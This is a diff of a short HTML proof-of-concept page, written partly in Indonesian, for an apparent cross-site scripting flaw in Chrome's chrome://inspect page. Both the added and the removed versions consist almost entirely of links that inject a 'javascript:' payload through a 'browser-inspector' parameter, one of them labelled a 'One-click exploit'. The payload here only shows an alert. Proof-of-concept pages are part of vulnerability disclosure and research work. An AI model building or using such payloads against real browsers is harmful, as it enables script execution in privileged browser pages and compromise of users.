@@ -1,27 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Chrome Inspect XSS PoC</title>
+  <title>chrome://inspect XSS PoC</title>
 </head>
 <body>
+  <h1>Click this to open chrome://inspect with payload</h1>
+  <a href="chrome://inspect/?browser-inspector=javascript:alert(document.domain)//">
+    Buka chrome://inspect (XSS)
+  </a>
 
-<h1>Klik Tautan Berikut untuk Memicu XSS</h1>
-<p>
-    Tautan ini akan mengarahkan browser ke halaman <code>chrome://inspect</code>
-    dengan parameter <code>browser-inspector</code> yang disuntikkan.
-</p>
+  <hr>
 
-<a href="chrome://inspect/#?browser-inspector=javascript:alert('XSS_SUCCESS_FROM_'%20+%20document.domain)">
-    Trigger XSS
-</a>
-
-<script>
-    // Hanya dieksekusi jika pengguna berada di lingkungan yang mengizinkan navigasi WebUI
-    setTimeout(() => {
-        // window.location.href = "chrome://inspect/#?browser-inspector=javascript:alert('XSS_AUTO_TRIGGER')";
-        // Umumnya bug ini memerlukan user-interaction (klik)
-    }, 1000);
-</script>
-
+  <h2>One-click exploit (langsung jalankan JS di chrome://inspect)</h2>
+  <a href="chrome://inspect/#devices?browser-inspector=javascript:alert('XSS di chrome://inspect - '+document.domain)//">
+    Klik ini → XSS langsung di chrome://inspect
+  </a>
 </body>
 </html>
